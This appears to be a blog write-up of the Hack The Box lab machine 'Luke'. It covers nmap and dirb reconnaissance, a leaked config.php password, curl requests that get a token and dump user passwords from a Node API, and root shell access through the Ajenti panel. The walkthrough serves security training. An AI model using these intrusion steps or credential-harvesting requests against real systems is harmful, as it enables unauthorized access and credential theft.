<!DOCTYPE html>
<html lang="en-us">

  <head>
  <link href="http://gmpg.org/xfn/11" rel="profile">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta http-equiv="content-type" content="text/html; charset=utf-8">

  <!-- Enable responsiveness on mobile devices-->
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">

  <title>
    
      Luke - 10.10.10.137 &middot; Highway to Root
    
  </title>

  <!-- CSS -->
  <link rel="stylesheet" href="http://localhost:4000/public/css/poole.css">
  <link rel="stylesheet" href="http://localhost:4000/public/css/syntax.css">
  <link rel="stylesheet" href="http://localhost:4000/public/css/hyde.css">
  <link rel="stylesheet" href="http://fonts.googleapis.com/css?family=PT+Sans:400,400italic,700|Abril+Fatface">

  <!-- Icons -->
  <link rel="apple-touch-icon-precomposed" sizes="144x144" href="http://localhost:4000/public/apple-touch-icon-144-precomposed.png">
                                 <link rel="shortcut icon" href="http://localhost:4000/public/favicon.ico">

  <!-- RSS -->
  <link rel="alternate" type="application/rss+xml" title="RSS" href="/atom.xml">
</head>


  <body>

    <div class="sidebar">
  <div class="container sidebar-sticky">
    <div class="sidebar-about">
      <h1>
        <a href="http://localhost:4000">
          Highway to Root
        </a>
      </h1>
      <p class="lead">...because everybody needs to know how deep the rabbit-hole goes.</p>
    </div>

    <nav class="sidebar-nav">
      <a class="sidebar-nav-item" href="http://localhost:4000">Home</a>

      

      
      
        
          
        
      
        
          
            <a class="sidebar-nav-item" href="/about/">About</a>
          
        
      
        
      
        
          
        
      
        
      
        
      
        
      

      <!--<a class="sidebar-nav-item" href="https://github.com/highwaytoroot/highwaytoroot.github.io//archive/v.zip">Download</a>-->
      <!--<a class="sidebar-nav-item" href="https://github.com/highwaytoroot/highwaytoroot.github.io/">GitHub project</a>-->
      <!--<span class="sidebar-nav-item">Currently v</span>-->
    </nav>

    <p>&copy; 2019. Content on this site is licensed under a <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/">Creative Commons Attribution 4.0 International license</a>.</p><img width=40% src="http://localhost:4000/images/by-nc-sa.png">
  </div>
</div>


    <div class="content container">
      <div class="post">
  <h1 class="post-title">Luke - 10.10.10.137</h1>
  <h2 class="post-title">6</h2>
  <span class="post-date">20 Sep 2019</span>
  <p><em>Write-up by Andrea Melis <a href="https://twitter.com/wild_boar">@wild_boar</a></em></p>

<h1 id="user">USER</h1>

<h2 id="reconnaissance">Reconnaissance</h2>

<h3 id="nmap">NMAP</h3>

<p>As usual we always start with <strong>Nmap</strong> scanning:</p>

<pre>root@pentestbox:~# nmap -sC -sV -oA luke 10.10.10.137

Starting Nmap 7.70 ( https://nmap.org ) at 2019-09-20 00:13 CEST
Nmap scan report for 10.10.10.137
Host is up (0.036s latency).
Not shown: 996 closed ports
PORT STATE SERVICE VERSION
<b>21/tcp open ftp vsftpd 3.0.3+ (ext.1)</b>
<b>22/tcp open ssh?</b>
<b>80/tcp open http</b>
<b>3000/tcp open http Node.js Express framework</b>
<b>8000/tcp open http Ajenti http control panel</b>

</pre>

<p>It seems there is anonymoys <strong>ftp</strong> login, so we logged in and there is only one file
available, which download tell us:</p>

<pre> $ cat for_Chihiro.txt
Dear Chihiro !!
As you told me that you wanted to learn Web Development and Frontend, I can
give you a little push by showing the sources of
the actual website I've created .
Normally you should know where to look but hurry up because I will delete
them soon because of our security policies !

Derry
</pre>

<p>So it may look like there is an hidden website or page somewhere.
So, first of all we scanned all possible files and folder over the port 80 and 3000
which look like a website over 80 port:</p>

<p><img src="./images/luke/port_80_luke.png" alt="" /></p>

<p>And over port 3000 a simple node js api service:</p>

<p><img src="./images/luke/port_3000_luke.png" alt="" /></p>

<h3 id="dirbuster">DirBuster</h3>

<p>With dirbuster and big.txt wordlist we found some interesting file such as:</p>

<pre>
File found: /config.php - 200
Dir found: /css/ - 200
File found: /css/bootstrap.min.css - 200
File found: /css/scrolling-nav.css - 200File found: /css/signin.css - 200
</pre>

<p>Where config.php retrieved us what it looks as db credentials:</p>

<pre>
$dbHost = 'localhost'; $dbUsername = 'root'; $dbPassword =
'Zk6heYCyv6ZE9Xcg'; $db = "login"; $conn = new mysqli($dbHost,
$dbUsername, $dbPassword,$db) or die("Connect failed: %s\n". $conn -&gt;
error);
</pre>

<p>But those credentials were incorrect for the login.php and /management login
which we found with dirb.
So we start to look at the js api service. We needed to retrieve the available api
so we used dirb again over this port:</p>

<pre>
 $dirb http://10.10.10.137:3000 -w /usr/share/wordlists/dirb/big.txt
-----------------
DIRB v2.22
By The Dark Raver
-----------------
START_TIME: Fri Sep 20 00:37:31 2019
URL_BASE: http://10.10.10.137:3000/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
OPTION: Not Stopping on warning messages
-----------------
GENERATED WORDS: 4612
---- Scanning URL: http://10.10.10.137:3000/ ----
+ http://10.10.10.137:3000/login (CODE:200|SIZE:13)
+ http://10.10.10.137:3000/Login (CODE:200|SIZE:13)
+ http://10.10.10.137:3000/users (CODE:200|SIZE:56)
-----------------
END_TIME: Fri Sep 20 00:40:28 2019
DOWNLOADED: 4612 - FOUND: 3
</pre>

<p>So we have a login api and users api.
Users api needs and authenticaton token probably supplied by the /login api.
So first we tried to login we the credentials found in the config.php file.</p>

<pre>
$ curl --header "Content-Type: application/json" \
&gt; --request POST \
&gt; --data '{"password":"Zk6heYCyv6ZE9Xcg", "username":"admin"}' \
&gt; http://10.10.10.137:3000/login
{"success":true,"message":"Authentication
successful!","token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2Vybm
FtZSI6ImFkbWluIiwiaWF0IjoxNTY4OTMyODcwLCJleHAiOjE1NjkwMTky
NzB9.NkXilej8x5JP2MOHRz3SDkgPs3AVz4YEmtg2s_H0siY"}
</pre>

<p><strong>Success!!</strong></p>

<p>The post requests give us the access token, which we can use to query the /users
api:</p>

<pre>
$ curl -X GET -H 'Authorization: Bearer
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwi
aWF0IjoxNTY4OTMyODcwLCJleHAiOjE1NjkwMTkyNzB9.NkXilej8x5JP2
MOHRz3SDkgPs3AVz4YEmtg2s_H0siY' http://10.10.10.137:3000/users/
[{"ID":"1","name":"Admin","Role":"Superuser"},
{"ID":"2","name":"Derry","Role":"Web Admin"},
{"ID":"3","name":"Yuri","Role":"Beta Tester"},
{"ID":"4","name":"Dory","Role":"Supporter"}]
</pre>

<p><strong>Perfect!</strong> We have users now, let’s try to query one user at time:</p>

<pre>
$ curl -X GET \
&gt; -H 'Authorization: Bearer
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwi
aWF0IjoxNTY4OTMyODcwLCJleHAiOjE1NjkwMTkyNzB9.NkXilej8x5JP2
MOHRz3SDkgPs3AVz4YEmtg2s_H0siY' \
&gt; http://10.10.10.137:3000/users/Dory
{"name":"Dory","password":"5y:!xa=ybfe)/QD"}
{"name":"Derry","password":"rZ86wwLvx7jUxtch"}
bet@tester87
{"name":"Admin","password":"WX5b7)&gt;/rp$U)FW"}
</pre>

<p>In fact we discovered after several tries that the Derry credentials were correct
for the /management panel
And this is what looks like the management panel; we just have some files
config.php login.php which we already had:</p>

<p><img src="./images/luke/after_login_luke.png" alt="" /></p>

<p>But now we alse have config.json file! Which looks really interesting since
seems to be something related to ajenti page, which is the login page discovered
on port 8000:
This is what login page looks like:</p>

<p><img src="./images/luke/ajenti_login_luke.png" alt="" /></p>

<p>And this is otherwise what the config.json file shows on /management page:</p>

<p><img src="./images/luke/json_luke.png" alt="" /></p>

<p>What is immediately visible is the password field;which seems to be the admin
password for ajenti login.</p>

<pre><b>password "KpMasng6S5EtTy9Z"</b></pre>

<p>So Username root and password KpMasng6S5EtTy9Z:</p>

<p><img src="./images/luke/logged_luke.png" alt="" /></p>

<p><strong>Logged in!!</strong></p>

<h1 id="root">ROOT</h1>

<p>This looks like Ajenti backend and after several google research we noticed that
there a “Terminal” options which it open a terminal with bash with the user
privileges, in our case guess what… root!!
So clicking on terminal and running a new one gave us a perfect shell with root
priv:</p>

<p><img src="./images/luke/rooted_luke.png" alt="" /></p>

<p>From here we can also of course create a reverse shell to our host machine but
the flag is already retrieved.</p>

<h4 id="thank-you-for-reading-this-write-up-feedback-is-appreciated-happy-hacking-">Thank you for reading this write-up. Feedback is appreciated! Happy hacking :)</h4>

</div>

<div class="related">
  <h2>Related Posts</h2>
  <ul class="related-posts">
    
      <li>
        <h3>
          <a href="/2019/09/27/kryptos/">
            Kryptos - 10.10.10.129
            <small>27 Sep 2019</small>
          </a>
        </h3>
      </li>
    
  </ul>
</div>

    </div>

  </body>
</html>
